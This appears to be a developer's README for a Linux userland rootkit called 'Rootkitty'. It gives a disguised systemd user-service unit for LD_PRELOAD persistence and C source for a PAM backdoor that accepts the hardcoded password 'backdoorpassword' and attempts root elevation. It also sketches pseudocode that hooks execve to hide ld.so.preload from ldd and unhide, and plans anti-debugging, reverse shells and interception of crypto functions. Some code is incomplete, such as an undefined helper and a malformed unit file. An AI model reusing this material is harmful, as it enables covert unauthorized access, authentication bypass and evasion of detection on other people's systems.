# Rootkitty
## Persistence Using SystemD services

place file here:
`~/.config/systemd/user/<your_filename>.service`

should look like this:
```rootkatz.service
[Unit]
Description= something, totally not a rootkit[Service]
ExecStart=/usr/bin/bash -c 'export LD_PRELOAD=<path_to_shared_lib>'
Restart=always
RestartSec=60[Install]
WantedBy=default.target
```

enable service like so:
`systemctl --user enable rootkatz.service`

this depends on the user being logged in.
to do this at boot (for servers, since they dont have users logged in) root must run:
`systemctl --enable-linger <username>` 
obviously since we dont have root access we cannot use this but 
we can check by `ls /var/lib/systemd/linger/` 
if lingering is available there is a empty file with username on it 

## cool stuff for libraries
`static void __attribute__((constructor)) function(args)` 
gets loaded and executed before evrythig

## PAM Backdoor 
```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <dlfcn.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>
#include <string.h>
#define PAM_EXTERN extern

int elevation(){
    uid_t UID = getuid();
    gid_t GID = getgid();

    if (seteuid(0) ==- 1){
        return -1;
    }
    if (setegid(0)==-1){
        seteuid(UID);
        return -1;
    }
    return 0;
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    int (*og_pam_sm_authenticate)(pam_handle_t *pamh, int flags, int argc, const char **argv);
    og_pam_sm_authenticate = dlsym(RTLD_NEXT, "pam_sm_authenticate");
    
    const char* passwd;
    pam_get_item(pamh, PAM_AUTHTOK, (const void**)&passwd);

    if(passwd != NULL && strcmp(passwd, "backdoorpassword") == 0) {
        return PAM_SUCCESS;
    }

    return og_pam_sm_authenticate(pamh, flags, argc, argv);
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    int (*og_pam_sm_setcred)(pam_handle_t *pamh, int flags, int argc, const char **argv);
    og_pam_sm_setcred = dlsym(RTLD_NEXT, "pam_sm_setcred");
    if (is_backdoor_used(pamh)){
        if(elevation()==0){
return PAM_SUCCESS;
        }
    }
    return og_pam_sm_setcred(pamh, flags, argc, argv);
}
// on exit
int drop_privileges(uid_t original_uid, gid_t original_gid) {
    if (setegid(original_gid)==-1){
        return -1;
    }
  if (seteuid(original_uid) == -1) {
        return -1;
    }
    return 0;
}
```
## Bypassing LDD, LD_LINUX, UNHIDE the lazy way 
hook execve:
if path = path of ldd or whatever
    save old uid 
    decrypt strings
    set uid to 0
    rename ld.so.preload to .ld.so.preload
    wait a lil bit
    undo


## more ideas
- anti debug
- PAM backdoor 
- persistence over systemd service
- reverse shell ipv4 and v6 
- intercept common cryptographic functions
